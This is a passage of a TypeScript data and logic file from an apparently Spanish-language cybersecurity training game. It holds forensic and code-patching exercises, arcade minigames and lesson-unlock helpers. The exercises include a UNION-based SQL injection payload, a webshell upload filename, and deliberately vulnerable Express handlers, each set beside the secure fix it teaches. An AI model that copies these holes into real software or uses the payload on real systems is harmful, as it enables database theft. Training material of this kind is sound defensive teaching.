          forensicClue: 'Proceso legítimo de protección antimalware.',
        },
      ],
      rootCauseQuestion: 'Tras eliminar el Infostealer "LummaStealer_agent.exe" que leyó las cookies del navegador, ¿qué acción adicional es obligatoria?',
      rootCauseOptions: [
        {
          id: 'rc_b1',
          text: 'Cerrar/revocar todas las sesiones activas en la nube, rotar las contraseñas y regenerar los tokens MFA del usuario.',
          isCorrect: true,
          explanation: '¡Correcto! Como el Infostealer ya había copiado las cookies de sesión hacia el C2, revocar los tokens activos invalida las sesiones robadas.',
        },
        {
          id: 'rc_b2',
          text: 'Cambiar solo el fondo de pantalla del computador.',
          isCorrect: false,
          explanation: 'Las cookies robadas seguirían siendo válidas para el atacante si no se revocan las sesiones en el servidor.',
        },
      ],
      feedback: {
        empathy: 'Los Infostealers actuales roban la cookie de sesión ya iniciada para no necesitar siquiera la contraseña ni el código MFA.',
        technicalIndicator:
          'Cuando un proceso lee "Login Data" o "Cookies" del navegador y transmite a un bot externo, todas las sesiones activas quedan comprometidas.',
        preventiveTip:
          'Evita guardar contraseñas críticas en el navegador y utiliza gestores de contraseñas dedicados con cifrado cero conocimiento.',
      },
    },
  ],

  'forensic-boss-6': [
    {
      id: 'ex_boss6_stage1',
      type: 'forensic_investigator',
      title: 'Gran Final (Etapa 1/2): Caza del Implante APT en el Servidor Central',
      instruction: 'Un grupo APT infiltró el servidor central. Neutraliza los 2 procesos espías en RAM y determina cómo lograron entrar.',
      suriPrompt: '¡Última misión para graduarte como Centinela Supremo! Limpia primero la memoria RAM.',
      suriPoseInitial: 'running',
      hostName: 'CORE-CLUSTER-PYME (Producción)',
      incidentBrief: 'Se detectó una intrusión avanzada combinada: un webshell inyectado por SQLi desplegó un recolector de datos en memoria.',
      processes: [
        {
          id: 'proc_f1',
          pid: 5501,
          processName: 'node_webshell_reverse.exe',
          signatureStatus: 'unsigned_suspicious',
          remoteEndpoint: '45.155.205.9:4444 (Reverse Shell APT)',
          cpuUsage: '29.0%',
          behaviorAlert: 'CRÍTICO: Proceso hijo invocado desde el servidor web ejecutando comandos shell remotos.',
          isMalicious: true,
          forensicClue: 'Implante de consola remota (Webshell) inyectado a través de una vulnerabilidad web no parcheada.',
        },
        {
          id: 'proc_f2',
          pid: 1120,
          processName: 'postgres.exe',
          signatureStatus: 'signed_microsoft',
          remoteEndpoint: '127.0.0.1:5432 (Base de Datos Interna)',
          cpuUsage: '6.5%',
          behaviorAlert: 'Motor oficial de base de datos relacional escuchando únicamente en interfaz local.',
          isMalicious: false,
          forensicClue: 'Servicio legítimo de base de datos.',
        },
        {
          id: 'proc_f3',
          pid: 6789,
          processName: 'exfil_dump_cloud.exe',
          signatureStatus: 'spoofed_cert',
          remoteEndpoint: '103.45.12.88:9001 (Túnel Exfiltración)',
          cpuUsage: '51.2%',
          behaviorAlert: 'CRÍTICO: Comprimiendo respaldos SQL y transmitiéndolos hacia IP anónima.',
          isMalicious: true,
          forensicClue: 'Herramienta de exfiltración activa.',
        },
      ],
      rootCauseQuestion: 'El proceso "node_webshell_reverse.exe" fue creado por el servidor web. ¿Cuál es el siguiente paso indispensable?',
      rootCauseOptions: [
        {
          id: 'rc_f1',
          text: 'Pasar inmediatamente a la Etapa 2 en la terminal DevSecOps y parchear la vulnerabilidad del código web que permitió inyectar el webshell.',
          isCorrect: true,
          explanation: '¡Exacto! Si no parcheas el código vulnerable, el atacante volverá a inyectar el webshell en segundos.',
        },
        {
          id: 'rc_f2',
          text: 'Dar por terminado el incidente sin revisar el código del portal web.',
          isCorrect: false,
          explanation: 'Dejar la vulnerabilidad abierta en el código permitiría la reinfección inmediata.',
        },
      ],
      feedback: {
        empathy: 'En incidentes reales, los equipos de Forense (Blue Team) y Desarrollo Seguro (DevSecOps) deben trabajar unidos.',
        technicalIndicator:
          'Erradicar el proceso en memoria detiene la sangría de datos, y parchear el endpoint vulnerable cierra la puerta de entrada.',
        preventiveTip:
          '¡Etapa 1 superada! Ahora despliega el parche final en el código.',
      },
    },
    {
      id: 'ex_boss6_stage2',
      type: 'code_patcher',
      title: 'Gran Final (Etapa 2/2): Cierre Definitivo de la Brecha en Código',
      instruction: 'Inyecta los 2 parches definitivos en el servidor de producción para sellar la seguridad de la empresa.',
      suriPrompt: '¡Aplica todo lo aprendido para obtener el título de Centinela Supremo!',
      suriPoseInitial: 'victory',
      appName: 'Core Producción PYME · Parcheo Final',
      waves: [
        {
          id: 'wave_final_1',
          vulnerabilityName: 'Brecha APT · Inyección SQL en Búsqueda de Clientes',
          endpoint: 'GET /api/clientes/buscar?filtro=',
          attackerPayload: "filtro = \"' UNION SELECT username, password_hash FROM admins --\"",
          vulnerableCodeLines: [
            'app.get("/api/clientes/buscar", async (req, res) => {',
            '  const q = "SELECT nombre, nit FROM clientes WHERE nombre LIKE \'%" + req.query.filtro + "%\'";',
            '  return res.json(await db.query(q));',
            '});',
          ],
          vulnerableLineIndex: 1,
          options: [
            {
              id: 'pf_1_ok',
              label: 'Parche Definitivo: Consulta Parametrizada con marcador seguro',
              securityLayer: 'Prepared Statement SQL',
              codeReplacement: '  return res.json(await db.execute("SELECT nombre, nit FROM clientes WHERE nombre LIKE ?", [`%${req.query.filtro}%`]));',
              isCorrect: true,
              explanation: '¡Vulnerabilidad UNION SQLi cerrada para siempre!',
            },
            {
              id: 'pf_1_bad',
              label: 'Parche Inseguro: Ocultar errores SQL en pantalla',
              securityLayer: 'Silent Error',
              codeReplacement: '  try { return res.json(await db.query(q)); } catch(e) { return res.json([]); }',
              isCorrect: false,
              explanation: 'Ocultar el error no evita que la consulta UNION extraiga la tabla de administradores.',
            },
          ],
        },
        {
          id: 'wave_final_2',
          vulnerabilityName: 'Brecha APT · Subida de Webshell Ejecutable (.php / .js)',
          endpoint: 'POST /api/perfil/subir-logo',
          attackerPayload: 'filename = "webshell_backdoor.js" (MIME alterado)',
          vulnerableCodeLines: [
            'app.post("/api/perfil/subir-logo", upload.single("file"), (req, res) => {',
            '  fs.renameSync(req.file.path, "./public/uploads/" + req.file.originalname);',
            '  return res.send("Archivo publicado");',
            '});',
          ],
          vulnerableLineIndex: 1,
          options: [
            {
              id: 'pf_2_ok',
              label: 'Parche Definitivo: Validar Magic Bytes (PNG/JPG), renombrar con UUID y almacenar fuera de ejecución',
              securityLayer: 'Validación Binaria + UUID',
              codeReplacement: '  if (!isValidImageSignature(req.file.buffer)) return res.status(400).end(); saveToIsolatedStorage(crypto.randomUUID() + ".png", req.file.buffer);',
              isCorrect: true,
              explanation: '¡Graduación completada! Has neutralizado tanto el implante en RAM como las brechas en el código.',
            },
            {
              id: 'pf_2_bad',
              label: 'Parche Inseguro: Confiar únicamente en req.file.mimetype enviado por el navegador',
              securityLayer: 'Cabecera Manipulable',
              codeReplacement: '  if (req.file.mimetype === "image/png") fs.renameSync(req.file.path, "./public/" + req.file.originalname);',
              isCorrect: false,
              explanation: 'El atacante puede falsificar la cabecera Content-Type: image/png manteniendo la extensión .js ejecutable.',
            },
          ],
        },
      ],
      feedback: {
        empathy: 'Has completado el entrenamiento más exigente de ciberseguridad práctica.',
        technicalIndicator:
          'Combinar prevención en código (OWASP DevSecOps), defensa de red (Firewall + VPN Zero Trust) y respuesta forense (SOC + CSI RAM) conforma una postura de seguridad inquebrantable.',
        preventiveTip:
          '🏆 ¡FELICIDADES! Has superado los 6 Cursos de Especialización Centinela de SuriLearn.',
      },
    },
  ],

  // ---------------------------------------------------------------------------
  // CURSO 7: ZONA ARCADE CENTINELA (JUEGOS CLÁSICOS)
  // ---------------------------------------------------------------------------
  'arcade-hangman-1': [
    {
      id: 'ex_arcade_hangman_01',
      type: 'cyber_hangman',
      title: 'Ahorcado Centinela',
      instruction: 'Descifra ambos conceptos clave antes de agotar tus 6 intentos:',
      suriPrompt: 'Lee la pista táctica de cada ronda y empieza por las vocales.',
      suriPoseInitial: 'idea',
      maxMistakes: 6,
      rounds: [
        {
          word: 'PHISHING',
          category: 'Ingeniería Social · 8 letras',
          clue: 'Ataque que suplanta bancos o RRHH por correo para robar credenciales.',
          explanation: 'El Phishing engaña mediante urgencia falsa y dominios suplantados.',
        },
        {
          word: 'RANSOMWARE',
          category: 'Malware Corporativo · 10 letras',
          clue: 'Código malicioso que cifra los archivos de la empresa y exige rescate.',
          explanation: 'Se contiene aislando la red, purgando procesos y restaurando copias 3-2-1.',
        },
      ],
      feedback: {
        empathy: 'Recordar los nombres exactos de los ataques ayuda a reportarlos al instante.',
        technicalIndicator: 'PHISHING y RANSOMWARE concentran la mayoría de incidentes en PYMES.',
        preventiveTip: 'Verifica siempre dominios reales y mantén copias de seguridad offline.',
      },
    },
  ],

  'arcade-snake-1': [
    {
      id: 'ex_arcade_snake_01',
      type: 'cyber_snake',
      title: 'Culebrita Firewall',
      instruction: 'Captura 6 paquetes seguros verdes y esquiva los bordes y trampas rojas:',
      suriPrompt: 'Usa flechas, WASD o el D-Pad táctil para guiar a Suri sin chocar.',
      suriPoseInitial: 'cool',
      gridSize: 12,
      targetSafeCount: 6,
      initialSpeedMs: 185,
      maxShields: 3,
      safeLabels: ['HTTPS', 'MFA', 'VPN', 'PATCH', 'BACKUP', 'AES256'],
      malwareLabels: ['PHISH', 'TROJAN', 'WORM', 'SQLI'],
      feedback: {
        empathy: 'Mantener el ritmo bajo velocidad creciente simula el monitoreo continuo de red.',
        technicalIndicator: 'Priorizar tráfico cifrado (HTTPS/VPN), parches y MFA reduce la superficie de ataque.',
        preventiveTip: 'Activa MFA y actualizaciones automáticas antes de navegar por redes externas.',
      },
    },
  ],

  'arcade-memory-1': [
    {
      id: 'ex_arcade_memory_01',
      type: 'cyber_memory',
      title: 'Memorama Centinela',
      instruction: 'Encuentra los 6 pares conectando cada amenaza con su defensa:',
      suriPrompt: 'Voltea dos tarjetas por turno y recuerda dónde viste cada vector.',
      suriPoseInitial: 'wink',
      maxMoves: 16,
      pairs: [
        {
          id: 'pair_bec',
          threatLabel: 'Fraude CEO urgente por WhatsApp',
          threatIcon: 'chat_error',
          defenseLabel: 'Confirmar por llamada o canal interno',
          defenseIcon: 'verified_user',
          explanation: 'El fraude BEC se detiene verificando fuera de banda.',
        },
        {
          id: 'pair_wifi',
          threatLabel: 'Wi-Fi abierto "Aeropuerto_Free"',
          threatIcon: 'wifi_off',
          defenseLabel: 'Activar túnel VPN cifrado',
          defenseIcon: 'vpn_lock',
          explanation: 'La VPN cifra el tráfico frente a sniffers Man-in-the-Middle.',
        },
        {
          id: 'pair_pwd',
          threatLabel: 'Contraseña corta "Admin2026"',
          threatIcon: 'lock_open',
          defenseLabel: 'Frase larga + Autenticación MFA',
          defenseIcon: 'password',
          explanation: 'La longitud alta y el MFA frenan ataques de fuerza bruta.',
        },
        {
          id: 'pair_exe',
          threatLabel: 'Adjunto "Factura.pdf.exe"',
          threatIcon: 'bug_report',
          defenseLabel: 'Bloquear doble extensión ejecutable',
          defenseIcon: 'gpp_good',
          explanation: 'Un PDF real nunca termina en .exe, .vbs o .scr.',
        },
        {
          id: 'pair_sqli',
          threatLabel: 'Inyección SQL en formulario',
          threatIcon: 'code_off',
          defenseLabel: 'Consultas SQL Parametrizadas',
          defenseIcon: 'security',
          explanation: 'Los Prepared Statements separan código SQL de datos del usuario.',
        },
        {
          id: 'pair_ransom',
          threatLabel: 'Ransomware cifrando carpetas',
          threatIcon: 'warning',
          defenseLabel: 'Aislar VLAN + Backup 3-2-1',
          defenseIcon: 'backup',
          explanation: 'Aislar el equipo detiene la propagación lateral en la red.',
        },
      ],
      feedback: {
        empathy: 'Asociar rápido cada amenaza con su control reduce dudas ante incidentes reales.',
        technicalIndicator: 'Cada pareja conecta un vector de ataque con su defensa recomendada por NIST/OWASP.',
        preventiveTip: 'Ten siempre a mano la acción defensiva antes de abrir enlaces o adjuntos.',
      },
    },
  ],

  'arcade-whack-1': [
    {
      id: 'ex_arcade_whack_01',
      type: 'threat_whack',
      title: 'Atrapa al Hacker',
      instruction: 'Neutraliza 8 intrusos rojos en 35s sin bloquear tráfico legítimo verde:',
      suriPrompt: 'Golpea rápido solo alertas rojas; deja pasar backups y tráfico HTTPS válido.',
      suriPoseInitial: 'running',
      durationSeconds: 35,
      targetHits: 8,
      maxMistakes: 3,
      spawnPool: [
        { label: 'Brute Force SSH', icon: 'gpp_bad', isThreat: true, tip: 'Bloquea escaneos repetidos en puerto 22.' },
        { label: 'Ransomware SMB', icon: 'bug_report', isThreat: true, tip: 'Cierra movimiento lateral en puerto 445.' },
        { label: 'Bot C2 Saliente', icon: 'skull', isThreat: true, tip: 'Corta beacons hacia servidores remotos.' },
        { label: 'SQLi Payload', icon: 'code_off', isThreat: true, tip: 'Frena inyecciones maliciosas sobre API/SQL.' },
        { label: 'Backup TLS Diario', icon: 'cloud_done', isThreat: false, tip: 'Respaldo automático autorizado de la empresa.' },
        { label: 'Portal HTTPS 443', icon: 'https', isThreat: false, tip: 'Tráfico legítimo de clientes cifrado.' },
        { label: 'DNS Corporativo', icon: 'dns', isThreat: false, tip: 'Resolución de nombres interna confiable.' },
      ],
      feedback: {
        empathy: 'En un centro de operaciones hay que actuar velozmente sin frenar servicios sanos.',
        technicalIndicator: 'Distinguir puertos atacados (SSH, SMB, C2) de backups TLS evita falsos positivos.',
        preventiveTip: 'Limita puertos administrativos como RDP (3389) y SSH (22) detrás de VPN.',
      },
    },
  ],
};

// Legacy aliases for backward compatibility
LESSON_EXERCISES_MAP['lesson_01'] = LESSON_EXERCISES_MAP['inbox-scanner-1'];
LESSON_EXERCISES_MAP['lesson_02'] = LESSON_EXERCISES_MAP['url-inspector-1'];
LESSON_EXERCISES_MAP['lesson_03'] = LESSON_EXERCISES_MAP['chat-urgency-1'];
LESSON_EXERCISES_MAP['lesson_04'] = LESSON_EXERCISES_MAP['attachment-phish-1'];
LESSON_EXERCISES_MAP['lesson_05'] = LESSON_EXERCISES_MAP['password-builder-1'];
LESSON_EXERCISES_MAP['lesson_06'] = LESSON_EXERCISES_MAP['permission-swipe-1'];
LESSON_EXERCISES_MAP['lesson_07'] = LESSON_EXERCISES_MAP['rapid-triage-1'];

function normalizeLegacyLessonId(lessonId: string): string {
  if (lessonId === 'lesson_01') return 'inbox-scanner-1';
  if (lessonId === 'lesson_02') return 'url-inspector-1';
  if (lessonId === 'lesson_03') return 'chat-urgency-1';
  if (lessonId === 'lesson_04') return 'attachment-phish-1';
  if (lessonId === 'lesson_05') return 'password-builder-1';
  if (lessonId === 'lesson_06') return 'permission-swipe-1';
  if (lessonId === 'lesson_07') return 'rapid-triage-1';
  return lessonId;
}

/**
 * Returns the next lesson ID in chronological order, or null if complete
 */
export function getNextLessonId(currentLessonId: string): string | null {
  const normalizedId = normalizeLegacyLessonId(currentLessonId);
  const idx = LESSON_SEQUENCE.indexOf(normalizedId as LessonId);
  if (idx >= 0 && idx < LESSON_SEQUENCE.length - 1) {
    return LESSON_SEQUENCE[idx + 1];
  }
  return null;
}

/**
 * Helper to compute dynamic statuses for a unit's nodes.
 * Note: Every unit unlocks its first lesson by default (and also unlocks ALL video game nodes
 * so students and professors can immediately test any course or video game!).
 */
function buildDynamicUnitNodes(
  baseNodes: LearningNode[],
  completedSet: Set<string>,
  claimedSet: Set<string>,
  lessonStars: Record<string, number> = {}
): { nodes: LearningNode[]; progressPercentage: number } {
  const dynamicNodes: LearningNode[] = baseNodes.map((baseNode, index) => {
    if (baseNode.type === 'reward_chest') {
      const isClaimed =
        claimedSet.has(baseNode.id) ||
        (baseNode.id === 'chest_01' && claimedSet.has('unit_1_completion_chest'));

      const prevLessonNode = baseNodes[index - 1];
      const isPrevCompleted = prevLessonNode ? completedSet.has(prevLessonNode.id) : true;

      if (isClaimed) {
        return {
          ...baseNode,
          status: 'completed' as const,
          isClaimed: true,
          stars: 0,
        };
      }

      if (isPrevCompleted) {
        return {
          ...baseNode,
          status: 'active' as const,
          isClaimed: false,
          stars: 0,
        };
      }

      return {
        ...baseNode,
        status: 'locked' as const,
        isClaimed: false,
        stars: 0,
      };
    }

    // Lesson Node
    const isCompleted = completedSet.has(baseNode.id);
    if (isCompleted) {
      const savedStars = lessonStars[baseNode.id];
      const stars = typeof savedStars === 'number' ? Math.max(1, Math.min(3, savedStars)) : 3;
      return {
        ...baseNode,
        status: 'completed' as const,
        stars,
      };
    }

    // First node of each unit OR interactive video game nodes are active/accessible so the professor/user can test any course and game immediately
    if (index === 0 || baseNode.isVideoGame) {
      return {
        ...baseNode,
        status: 'active' as const,
        stars: 0,
      };
    }

    const prevNode = baseNodes[index - 1];
    let isPrevCompleted = false;
    if (prevNode.type === 'reward_chest') {
      const lessonBeforeChest = baseNodes[index - 2];
      isPrevCompleted = lessonBeforeChest ? completedSet.has(lessonBeforeChest.id) : false;
    } else {
      isPrevCompleted = completedSet.has(prevNode.id);
    }

    if (isPrevCompleted) {
      return {
        ...baseNode,
        status: 'active' as const,
        stars: 0,
      };
    }

    return {
      ...baseNode,
      status: 'locked' as const,
      stars: 0,
    };
  });

  const totalLessons = baseNodes.filter((n) => n.type === 'lesson').length;
  const completedLessonsCount = dynamicNodes.filter(
    (n) => n.type === 'lesson' && n.status === 'completed'
  ).length;
  const progressPercentage =
    totalLessons > 0 ? Math.round((completedLessonsCount / totalLessons) * 100) : 0;

  return { nodes: dynamicNodes, progressPercentage };
}

/**
 * Builds all 6 complete LearningUnits with theory guides, briefings, and dynamic statuses
 */
export function buildAllLearningUnits(
  completedLessons: string[] = [],
  claimedRewards: string[] = [],
  lessonStars: Record<string, number> = {}
): LearningUnit[] {
  const completedSet = new Set(completedLessons.map(normalizeLegacyLessonId));
  const claimedSet = new Set(claimedRewards);

  const u1 = buildDynamicUnitNodes(UNIT_1_NODES, completedSet, claimedSet, lessonStars);
  const u2 = buildDynamicUnitNodes(UNIT_2_NODES, completedSet, claimedSet, lessonStars);
  const u3 = buildDynamicUnitNodes(UNIT_3_NODES, completedSet, claimedSet, lessonStars);
  const u4 = buildDynamicUnitNodes(UNIT_4_NODES, completedSet, claimedSet, lessonStars);
  const u5 = buildDynamicUnitNodes(UNIT_5_NODES, completedSet, claimedSet, lessonStars);
  const u6 = buildDynamicUnitNodes(UNIT_6_NODES, completedSet, claimedSet, lessonStars);
  const u7 = buildDynamicUnitNodes(UNIT_7_NODES, completedSet, claimedSet, lessonStars);

  return [
    {
      id: 'unit_01',
      unitNumber: 1,
      title: 'Curso 1: Anatomía del Phishing e Ingeniería Social',
      description: 'Cabeceras SPF/DKIM, disección DNS, fraude del CEO (BEC), ejecutables .pdf.exe y radar contrarreloj.',
      moduleBadge: 'Módulo 1 · Fundamentos y Phishing',
      icon: 'phishing',
      progressPercentage: u1.progressPercentage,
      nodes: u1.nodes,
      theoryGuide: UNIT_THEORY_GUIDES.unit_01,
    },
    {
      id: 'unit_02',
      unitNumber: 2,
      title: 'Curso 2: Criptografía, Identidad y Bastión Firewall',
      description: 'Entropía NIST SP 800-63B, privilegio mínimo móvil y videojuego arcade de defensa de paquetes en vivo.',
      moduleBadge: 'Módulo 2 · Criptografía y Firewall Arcade',
      icon: 'shield',
      progressPercentage: u2.progressPercentage,
      nodes: u2.nodes,
      theoryGuide: UNIT_THEORY_GUIDES.unit_02,
    },
    {
      id: 'unit_03',
      unitNumber: 3,
      title: 'Curso 3: Redes Seguras, Wi-Fi Público y Laberinto VPN',
      description: 'Defensa ante Sniffers Man-in-the-Middle, redes Evil Twin y videojuego 2D de infiltración con túnel VPN + MFA.',
      moduleBadge: 'Módulo 3 · Redes y Laberinto Táctico 2D',
      icon: 'vpn_lock',
      progressPercentage: u3.progressPercentage,
      nodes: u3.nodes,
      theoryGuide: UNIT_THEORY_GUIDES.unit_03,
    },
    {
      id: 'unit_04',
      unitNumber: 4,
      title: 'Curso 4: Respuesta a Incidentes SOC, Ransomware e IA',
      description: 'Consola SOC en vivo contra Ransomware (Aislar, Purgar, Backup 3-2-1) y detección de Deepfakes de voz con IA.',
      moduleBadge: 'Módulo 4 · Consola SOC y Defensa IA',
      icon: 'emergency',
      progressPercentage: u4.progressPercentage,
      nodes: u4.nodes,
      theoryGuide: UNIT_THEORY_GUIDES.unit_04,
    },
    {
      id: 'unit_05',
      unitNumber: 5,
      title: 'Curso 5: Seguridad Web OWASP & Blindaje DevSecOps',
      description: 'Prevención de Inyección SQL (SQLi), XSS, IDOR y videojuego interactivo de parcheo de código en vivo.',
      moduleBadge: 'Módulo 5 · OWASP Top 10 y DevSecOps',
      icon: 'terminal',
      progressPercentage: u5.progressPercentage,
      nodes: u5.nodes,
      theoryGuide: UNIT_THEORY_GUIDES.unit_05,
    },
    {
      id: 'unit_06',
      unitNumber: 6,
      title: 'Curso 6: Forense Digital, Threat Hunting & Anti-IA',
      description: 'Laboratorio CSI Cyber de caza de troyanos en memoria RAM, bloqueo de servidores C2 y dictamen de causa raíz (IoC).',
      moduleBadge: 'Módulo 6 · CSI Forense y Threat Hunting',
      icon: 'biotech',
      progressPercentage: u6.progressPercentage,
      nodes: u6.nodes,
      theoryGuide: UNIT_THEORY_GUIDES.unit_06,
    },
    {
      id: 'unit_07',
      unitNumber: 7,
      title: 'Curso 7: Zona Arcade Centinela (Juegos Clásicos)',
      description: 'Ahorcado Centinela, Culebrita Firewall, Memorama Amenaza↔Defensa y Atrapa al Hacker en vivo.',
      moduleBadge: 'Módulo 7 · Zona Arcade Clásica',
      icon: 'sports_esports',
      progressPercentage: u7.progressPercentage,
      nodes: u7.nodes,
      theoryGuide: UNIT_THEORY_GUIDES.unit_07,
    },
  ];
}

/**
 * Backward-compatible helper returning Unit 1
 */
export function buildLearningUnit(
  completedLessons: string[] = [],
  claimedRewards: string[] = []
): LearningUnit {
  return buildAllLearningUnits(completedLessons, claimedRewards)[0];
}

/**
 * Returns metadata for a specific lesson node across all 6 courses
 */
export function getLessonNode(lessonId: string): LearningNode | undefined {
  const resolvedId = normalizeLegacyLessonId(lessonId);
  return ALL_BASE_NODES.find((n) => n.id === resolvedId);
}

/**
 * Resolves exercises by their IDs across all 6 courses (used by the Error Review Hub)
 */
export function getExercisesByIds(ids: string[]): Exercise[] {
  if (!Array.isArray(ids) || ids.length === 0) return [];
  const allById = new Map<string, Exercise>();
  for (const lessonId of LESSON_SEQUENCE) {
    const list = LESSON_EXERCISES_MAP[lessonId] || [];
    for (const ex of list) {
      if (!allById.has(ex.id)) {
        allById.set(ex.id, ex);
      }
    }
  }
  const resolved: Exercise[] = [];
  const seen = new Set<string>();
  for (const id of ids) {
    if (seen.has(id)) continue;
    const found = allById.get(id);
    if (found) {
      resolved.push(found);
      seen.add(id);
    }
  }
  return resolved;
}
